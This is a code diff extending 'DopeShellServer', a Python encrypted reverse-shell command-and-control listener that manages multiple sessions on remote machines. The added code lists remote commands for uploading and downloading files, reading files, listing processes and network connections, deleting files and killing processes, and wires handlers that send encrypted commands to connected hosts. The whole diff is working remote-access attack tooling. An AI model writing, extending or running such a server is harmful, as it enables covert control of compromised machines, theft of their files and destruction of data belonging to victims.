@@ -4,6 +4,7 @@ import socket
 import threading
 import base64
 import os
+import struct
 import platform
 import argparse
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
@@ -20,6 +21,37 @@ class DopeShellServer:
         self.sessions = {}
         self.session_counter = 1
         self.active_session = None
+        self.commands = {
+            'help': 'List all commands and their usage.',
+            'exit': 'Terminate the session.',
+            'switch <session_id>': 'Switch to another active session.',
+            'sessions': 'List all active sessions.',
+            'upload <local_path> <remote_path>': 'Upload a file from the local machine to the remote machine.',
+            'download <remote_path> <local_path>': 'Download a file from the remote machine to the local machine.',
+            'pwd': 'Print the current working directory on the remote machine.',
+            'cd <directory>': 'Change the current working directory on the remote machine.',
+            'ls [directory]': 'List files in the specified or current directory on the remote machine.',
+            'ps': 'List running processes on the remote machine.',
+            'netstat': 'Show network connections on the remote machine.',
+            'ifconfig/ipconfig': 'Show network configuration (depending on OS).',
+            'cat <file_path>': 'Display the contents of a file on the remote machine.',
+            'info': 'Display system information of the remote machine.',
+            'mkdir <directory>': 'Create a new directory on the remote machine.',
+            'delete <file_path>': 'Delete a file on the remote machine.',
+            'kill <pid>': 'Kill a process on the remote machine by PID.',
+            'clear': 'Clear the screen in the shell.',
+            'find <filename>': 'Find a file by name on the remote machine.',
+            'sysinfo': 'Display detailed system information.',
+        }
+
+    def receive_data(self, client_socket):
+        # Read the data length first
+        data_length = struct.unpack('>I', client_socket.recv(4))[0]
+        data = b""
+        while len(data) < data_length:
+            chunk = client_socket.recv(4096)
+            data += chunk
+        return self.decrypt(data)
 
     def encrypt(self, data):
         iv = os.urandom(16)
@@ -45,6 +77,11 @@ class DopeShellServer:
             if command.lower() == 'exit':
                 client_socket.send(self.encrypt(command.encode('utf-8')))
                 break
+
+            if command.lower() == 'help':
+                for cmd, desc in self.commands.items():
+                    print(f"{cmd}: {desc}")
+                continue
 
             elif command.lower().startswith('ls'):
                 client_socket.send(self.encrypt(command.encode('utf-8')))
@@ -87,6 +124,29 @@ class DopeShellServer:
                 response = client_socket.recv(4096)
                 print(self.decrypt(response).decode('utf-8'))
 
+            elif command.lower() in ['mkdir', 'delete', 'kill', 'clear', 'find', 'sysinfo']:
+                client_socket.send(self.encrypt(command.encode('utf-8')))
+                response = client_socket.recv(4096)
+                print(self.decrypt(response).decode('utf-8'))
+
+            elif command.lower().startswith('cat'):
+                client_socket.send(self.encrypt(command.encode('utf-8')))
+                response = self.receive_data(client_socket)
+                print(response.decode('utf-8'))
+
+            elif command.lower() in ['ifconfig', 'ipconfig', 'find']:
+                client_socket.send(self.encrypt(command.encode('utf-8')))
+                response = self.receive_data(client_socket)
+                print(response.decode('utf-8'))
+
+            elif command.lower() in ['ps', 'netstat']:
+                client_socket.send(self.encrypt(command.encode('utf-8')))
+                response = self.receive_data(client_socket)
+                print(response.decode('utf-8'))
+            
+            elif command.lower() == 'sessions':
+                self.list_sessions()
+
             elif command.lower().startswith("switch"):
                 _, new_session_id = command.split()
                 if int(new_session_id) in self.sessions:
@@ -108,7 +168,7 @@ class DopeShellServer:
 
     def run(self):
         print(f"[*] Listening on {self.host}:{self.port}")
-        while True:
+        while True: 
             client_socket, addr = self.sock.accept()
             session_id = self.session_counter
             print(f"[*] Connection from {addr}, Session ID: {session_id}")
